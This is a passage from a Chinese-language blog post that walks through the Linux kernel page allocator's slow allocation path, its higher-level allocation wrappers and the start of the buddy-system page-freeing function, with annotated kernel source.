id="III-alloc-pages-slowpath-：慢速分配路径">III. __alloc_pages_slowpath()：慢速分配路径</h3><p>当快速路径的分配不成功时，说明系统当前可能已经没有足够的连续的空闲页面，这时我们就要进入到慢速路径的分配，<strong>进行内存碎片整理与内存回收</strong>，之后再进行分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_slowpath</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> *<span class="hljs-title">ac</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;<br><span class="hljs-type">const</span> <span class="hljs-type">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> did_some_progress;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_priority</span> <span class="hljs-title">compact_priority</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_result</span> <span class="hljs-title">compact_result</span>;</span><br><span class="hljs-type">int</span> compaction_retries;<br><span class="hljs-type">int</span> no_progress_loops;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpuset_mems_cookie;<br><span class="hljs-type">int</span> reserve_flags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们还进行了健全性检查，以发现非原子上下文中的 caller 滥用原子储备（的行为）。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE((gfp_mask &amp; (__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)) ==<br>(__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)))<br>gfp_mask &amp;= ~__GFP_ATOMIC;<br><br>retry_cpuset:<br>compaction_retries = <span class="hljs-number">0</span>;<br>no_progress_loops = <span class="hljs-number">0</span>;<br>compact_priority = DEF_COMPACT_PRIORITY;<br>cpuset_mems_cookie = read_mems_allowed_begin();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 仅在 kswapd 需要被唤醒前，快速路径使用保守的 alloc_flags 才能成功，</span><br><span class="hljs-comment"> * 并且避免精确地设置 alloc_flags。 所以我们现在这么做。</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">// 重新设置 alloc_flags，因为快速路径的分配在 kswapd 被唤醒之前</span><br>    <span class="hljs-comment">// 只有使用保守的 alloc_flags 才能成功，而现在我们将唤醒 kswapd，</span><br>    <span class="hljs-comment">// 因此恢复使用原有的 gfp_mask 对应的 alloc_flags</span><br>alloc_flags = gfp_to_alloc_flags(gfp_mask);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们需要为 zonelist 迭代器重新计算起始点，因为我们可能在快速路径中</span><br><span class="hljs-comment"> * 使用了不同的 nodemask ，或是有个 cpuset 的修改而我们正在重试</span><br><span class="hljs-comment"> * - 否则我们可能会无休止地迭代不合格的 zone</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><span class="hljs-keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)<br><span class="hljs-keyword">goto</span> nopage;<br><br>    <span class="hljs-comment">// 如果 ALLOC_KSWAPD，唤醒 kswapd 线程回收内存</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 调整后的 alloc_flags 可能会立即成功，所以先进行尝试</span><br><span class="hljs-comment"> */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 对于代价高的分配, 首先尝试直接的 compaction（译注：碎片整理机制）,</span><br><span class="hljs-comment"> * 因为有可能我们仍有足够的基本页面，并不需要去回收. 对于不可迁移的高阶分配，</span><br><span class="hljs-comment"> * 同样这么做, 因为 compaction 将尝试通过从相同迁移类型的块进行迁移</span><br><span class="hljs-comment"> * 以避免永久的碎片. 别对允许忽视水位线的分配尝试这个，因为</span><br><span class="hljs-comment"> * ALLOC_NO_WATERMARKS 还没发生。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (can_direct_reclaim &amp;&amp;<br>(costly_order ||<br>   (order &gt; <span class="hljs-number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))<br>&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;<br>page = __alloc_pages_direct_compact(gfp_mask, order,<br>alloc_flags, ac,<br>INIT_COMPACT_PRIORITY,<br>&amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 检查带有 __GFP_NORETRY 的代价高的分配, 其</span><br><span class="hljs-comment"> * 包括一些 THP page fault 的分配</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若分配整个 pageblock(s) 且 compaction 由于所有的 zone</span><br><span class="hljs-comment"> * 都在水位线下失败了，或是被禁止了因为其最近在该order上失败了，</span><br><span class="hljs-comment"> * 除非分配器有请求的 compaction 与回收尝试，否则直接失败</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 回收是：</span><br><span class="hljs-comment"> *  - 可能非常昂贵因为 zones 可能远低于他们的低水位线，</span><br><span class="hljs-comment"> *    或是这是非常突发的高阶分配的一部分,</span><br><span class="hljs-comment"> *  - 不一定会有帮助因为 isolate_freepages() 可能不会在</span><br><span class="hljs-comment"> *    被释放的页面上迭代作为其线性扫描的一部分，且</span><br><span class="hljs-comment"> *  - 不大可能会让整个 pageblocks 自己释放</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (compact_result == COMPACT_SKIPPED ||<br>    compact_result == COMPACT_DEFERRED)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 看起来好像 reclaim/compaction 是值得尝试的, 但</span><br><span class="hljs-comment"> * 同步的 compaction 可能会非常 expensive, 故保持</span><br><span class="hljs-comment"> * 使用异步的 compaction.</span><br><span class="hljs-comment"> */</span><br>compact_priority = INIT_COMPACT_PRIORITY;<br>&#125;<br>&#125;<br><br>retry:<br><span class="hljs-comment">/* 确保只要我们循环， kswapd 便不会意外地休眠 */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br>reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);<br><span class="hljs-keyword">if</span> (reserve_flags)<br>alloc_flags = current_alloc_flags(gfp_mask, reserve_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若内存策略可以忽略，重置 nodemask 与 zonelist 迭代器。</span><br><span class="hljs-comment"> * 这些分配具有高优先级与系统性，而非用户导向。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;<br>ac-&gt;nodemask = <span class="hljs-literal">NULL</span>;<br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br>&#125;<br><br><span class="hljs-comment">/* 带着可能调整过 zonelist 与 alloc_flags 再次尝试 */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 调用方不想要回收, 我们无法平衡任何事 */</span><br><span class="hljs-keyword">if</span> (!can_direct_reclaim)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* 避免递归地直接回收 */</span><br><span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* 尝试直接回收后分配 */</span><br>page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,<br>&amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 尝试直接 compaction 后分配 */</span><br>page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,<br>compact_priority, &amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 若是特别指定的请求，不要循环 */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 不要重试高花销的高阶分配除非他们是</span><br><span class="hljs-comment"> * __GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,<br> did_some_progress &gt; <span class="hljs-number">0</span>, &amp;no_progress_loops))<br><span class="hljs-keyword">goto</span> retry;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若0阶的回收无法取得任何进展，则重试 compaction 没有任何意义，</span><br><span class="hljs-comment"> * 因为当前对 compaction 的实现是基于有足够的空闲内存的</span><br><span class="hljs-comment"> *  (参见 __compaction_suitable)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (did_some_progress &gt; <span class="hljs-number">0</span> &amp;&amp;<br>should_compact_retry(ac, order, alloc_flags,<br>compact_result, &amp;compact_priority,<br>&amp;compaction_retries))<br><span class="hljs-keyword">goto</span> retry;<br><br><br><span class="hljs-comment">/* 在我们开始 OOM killing 之前处理可能的 cpuset 更新竞争 */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/* 回收失败了, 开始 killing 一些东西 */</span><br>    <span class="hljs-comment">// 要杀一些进程或是别的东西来腾内存了</span><br>page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 在无尽的循环中避免没有水位线的分配 */</span><br><span class="hljs-keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;<br>    (alloc_flags &amp; ALLOC_OOM ||<br>     (gfp_mask &amp; __GFP_NOMEMALLOC)))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* 若 OOM killer 取得了一些成效，重试 */</span><br><span class="hljs-keyword">if</span> (did_some_progress) &#123;<br>no_progress_loops = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br>nopage:<br><span class="hljs-comment">/* 在我们失败之前处理可能的 cpuset 的更新竞争 */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 确保 __GFP_NOFAIL 请求没有泄露且确保我们一直在重试</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 所有存在的 __GFP_NOFAIL 用户都是可以被阻塞的, </span><br><span class="hljs-comment"> * 故对任何新的实际上需要 GFP_NOWAIT 的用户进行警告</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(!can_direct_reclaim))<br><span class="hljs-keyword">goto</span> fail;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 这个上下文的 PF_MEMALLOC 请求非常奇怪</span><br><span class="hljs-comment"> * 因为我们不能回收任何东西只能循环等待</span><br><span class="hljs-comment"> * 某人来为我们做些什么</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(current-&gt;flags &amp; PF_MEMALLOC);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 无失败的高开销的 orders 是一项艰巨的要求，</span><br><span class="hljs-comment"> * 我们对此并没有太多准备，故让我们警告这些用户</span><br><span class="hljs-comment"> * 以便于我们能够识别出他们并将之转化为别的东西</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(order &gt; PAGE_ALLOC_COSTLY_ORDER);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过让他们能访问保留的内存来帮助非失败的分配</span><br><span class="hljs-comment"> * 但不使用 ALLOC_NO_WATERMARKS 因为这可能</span><br><span class="hljs-comment"> * 大量减少内存保留区而让情况更坏</span><br><span class="hljs-comment"> */</span><br>page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_HARDER, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br>cond_resched();<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>fail:<br>warn_alloc(gfp_mask, ac-&gt;nodemask,<br><span class="hljs-string">&quot;page allocation failure: order:%u&quot;</span>, order);<br>got_pg:<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们先补充一个概念——<code>Memory compaction</code> 机制，其实就是整理内存碎片，对零散的内存页进行迁移，从而将零散的空闲内存页变成大块的空闲内存，不过这里只整理可以移动的碎片：</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>现在我们来看慢速分配的整个流程：</p><ul><li>使用原有的 gfp_flag 重新设置 alloc_flag，并重新计算 preferred zone，若设置了 <code>ALLOC_KSWAPD</code> 则调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收</li><li>之后重新尝试快速路径的分配，若成功则直接返回</li><li>接下来调用 <code>__alloc_pages_direct_compact()</code> 进行 compaction，该函数内部在整理完后会重新尝试快速路径的分配，若成功则直接返回</li><li>（retry）接下来调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收</li><li>调整 zonelist 与 alloc_flag，之后再次尝试快速路径分配，若成功则直接返回</li><li>若 gfp_flag 中没有 <code>__GFP_DIRECT_RECLAIM</code> 或是进程 PCB 的 flag 中有 <code>PF_MEMALLOC</code>，直接跳转到 （nopage）</li><li>调用 <code>__alloc_pages_direct_reclaim()</code> 进行内存回收（内部调用 <code>__perform_reclaim()</code>）与快速路径分配，若成功则直接返回</li><li>调用 <code>__alloc_pages_direct_compact()</code> 进行 compaction 与快速路径分配，若成功则直接返回</li><li>如果设置了 <code>__GFP_NORETRY</code> ，或是该次内存分配开销较高（<code>order &gt; PAGE_ALLOC_COSTLY_ORDER</code>）且未设置 <code>__GFP_RETRY_MAYFAIL</code>，直接跳到 （nopage）</li><li>调用 <code>should_reclaim_retry()</code> 判断是否需要重新回收，若是则跳回（retry）</li><li>调用 <code>should_compact_retry()</code> 判断是否需要重新进行 compaction，若是则跳回（retry）</li><li>调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头</li><li>调用 <code>__alloc_pages_may_oom()</code> 尝试 kill 一些进程来释放内存，该函数内首先还是会先进行一次快速分配，之后才是调用 <code>out_of_memory()</code> 来杀掉最适合的进程以释放内存，最后若设置了 <code>__GFP_NOFAIL</code> 则调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配，在该函数中会两次走快速路径进行分配（第一次会额外附加上 <code>ALLOC_CPUSET</code> 的 flag）</li><li>如果把当前进程杀掉了，跳到（nopage）；如果杀进程取得了成效，跳回（retry）</li><li>（nopage）调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头</li><li>若设置了 <code>__GFP_NOFAIL</code> 则进行一系列的警告，并调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配，若未成功则跳回（retry）</li><li>返回结果</li></ul><p><img src="https://s2.loli.net/2022/07/06/eCg12KJIZuw9aon.png" alt="image.png"></p><h2 id="四、上层封装分配函数">四、<em>上层封装分配函数</em></h2><p>在 <code>__alloc_pages_nodemask()</code> 上层主要有三个页面分配函数，其调用路径如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__alloc_pages_node</span>  <span class="hljs-comment">/*返回struct page的指针*/</span><br>    <span class="hljs-variable">__alloc_pages</span><br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br><br>alloc_pages         <span class="hljs-comment">/*返回struct page的指针*/</span><br>    alloc_pages_current<br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br>        <br><span class="hljs-variable">__get_free_pages</span>    <span class="hljs-comment">/*返回页面的虚拟地址*/</span><br>    <span class="hljs-variable">__get_free_pages</span><br>    alloc_pages<br>            alloc_pages_current<br>            <span class="hljs-variable">__alloc_pages_nodemask</span><br></code></pre></td></tr></table></figure><h1>0x03.页的释放</h1><p>前面我们讲了页面是如何分配的，现在我们来看页面是如何释放的</p><h2 id="一、-free-one-page-：释放页面的核心函数">一、__free_one_page()：释放页面的核心函数</h2><p>该函数是 buddy system 中用以进行页面释放的<strong>核心函数</strong>，所有的页面释放 API 都是基于该函数的封装</p><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要作用是将特定页面释放到特定 zone 上，需要注意的是这里的 <code>one page</code> 不是一张页框而是一块连续内存（可能有多张页）</p><p>还需要注意的是这是一个释放页面的<strong>基本函数</strong>，故我们需要提供待释放页面的页结构体（struct page）、页框号、页面块的阶（order）、目标 zone、迁移类型等信息——这些信息通常由上层封装函数提供，这个函数所做的只是简单地将页挂回对应链表并检查合并的操作</p><p>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * buddy system 分配器的释放函数.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * buddy system 的想法是为多种“orders”的内存块</span><br><span class="hljs-comment"> * 维护一个直接映射表（包含位值）. 底部级别的表包含</span><br><span class="hljs-comment"> * 对最小的可分配内存单元（这里便是页面）的映射,</span><br><span class="hljs-comment"> * 而往上每更高一级则描述了从其下的一级的一对单元，因此是&quot;buddies&quot;.</span><br><span class="hljs-comment"> * 从高层看，这里所做的仅是在标记底层可用的表项，</span><br><span class="hljs-comment"> * 并根据需要向上传播更改，再加上一些与 VM 系统的其他部分</span><br><span class="hljs-comment"> * 良好协作所需要的计数。</span><br><span class="hljs-comment"> * 在每个级别, 我们都保持一个 pages 的 list, 作为连续的</span><br><span class="hljs-comment"> * 长度为(1 &lt;&lt; order)的空闲页的头节点并标记上 PageBuddy.</span><br><span class="hljs-comment"> * Page&#x27;s order 被记录在 page_private(page) 域.</span><br><span class="hljs-comment"> * 故当我们在分配或释放其一时, 我们可以得到另一个的状态。</span><br><span class="hljs-comment"> * 也就是说，若我们分配一个小的块，而两个都是空闲的，</span><br><span class="hljs-comment"> * 区域的剩余部分必须被分割成块. 若一个块被释放了，</span><br><span class="hljs-comment"> * 而他的 buddy 也是闲置的, 那么这将触发合并成一个更大的块</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __free_one_page(<span class="hljs-keyword">struct</span> page *page,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn,<br><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,<br><span class="hljs-type">int</span> migratetype, <span class="hljs-type">fpi_t</span> fpi_flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">capture_control</span> *<span class="hljs-title">capc</span> =</span> task_capc(zone);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buddy_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> combined_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> 